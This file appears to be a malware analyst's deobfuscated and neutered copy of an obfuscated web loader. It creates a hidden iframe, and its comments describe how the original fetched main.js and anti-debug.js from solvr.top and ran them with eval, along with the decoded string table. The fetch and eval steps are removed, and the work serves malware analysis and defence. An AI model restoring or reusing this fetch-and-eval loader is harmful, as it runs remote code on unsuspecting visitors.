/**
 * Fully deobfuscated loader.
 *
 * Original was an obfuscator.io-style packer: 4 chained string tables
 * (XOR-encrypted + rotated), Proxy-based lookups, fake control-flow
 * switch, and dead-code guards. All of that is collapsed into the code
 * below.
 *
 * Deobfuscated table (solver function -> decoded value):
 *   _dispatchReader: (72)->document (10)->"/dv3/" (115)->36 (98)->document
 *         (97)->display (111)/(113)->Math (104)->error (107)->onload
 *         (101)->fetch (103)/(124)->slice
 *   _safeCounter:    (38)->createElement (11)->Math (60)->slice (50)->none
 *         (23)->body (48)->bind (51)->2 (22)->2 (6)->setTimeout (40)->random
 *         (36)->random
 *   _queuePush:      (68)->iframe (122)->random (89)->2 (70)->appendChild
 *         (81)->contentWindow (99)->id (83)->2000 (123)/(100)->toString
 *         (118)->text
 *   _nextLoad:       (30)->src (46)->style (48)->contentWindow (36)->fetchContext
 *         (23)->Promise (45)->"https://solvr.top/main.js?v="
 *         (20)->"https://solvr.top/anti-debug.js?v=" (13)/(59)->36 (57)->console
 *         (111)->toString
 */

(async function () {
  // globalThis capture
  var glob = (function () {
    try {
      return Function("return this")();
    } catch (e) {
      return typeof globalThis !== "undefined" ? globalThis : this;
    }
  })();

  // Hidden same-origin iframe, used only so the fetch happens from the
  // iframe's window context and the load can be waited on.
  var iframe = document.createElement("iframe");
  iframe.src = "/dv3/" + Math.random().toString(36).slice(2);
  iframe.style.display = "none";
  iframe.id = "fetchContext";
  document.body.appendChild(iframe);

  // Wait until the iframe finished loading (onload, or 2 s fallback timer).
  await new Promise(function (resolve) {
    iframe.onload = resolve;
    setTimeout(resolve, 2000);
  });

  // NEUTERED: fetch() bound to the iframe's window, and the two requests:
  //   iframeFetch = iframe.contentWindow.fetch.bind(iframe.contentWindow);
  //   mainUrl = "https://solvr.top/main.js?v=" + random base36
  //   antiDebugUrl = "https://solvr.top/anti-debug.js?v=" + random base36
  //   res1 = await iframeFetch(mainUrl); code1 = await res1.text();
  //   res2 = await iframeFetch(antiDebugUrl); code2 = await res2.text();
  //   eval(code1); eval(code2);
  // All of the above are removed — no network, no eval.

  try {
    // NEUTERED (no fetch / no eval executed)
  } catch (err) {
    console.error(err);
  }
})();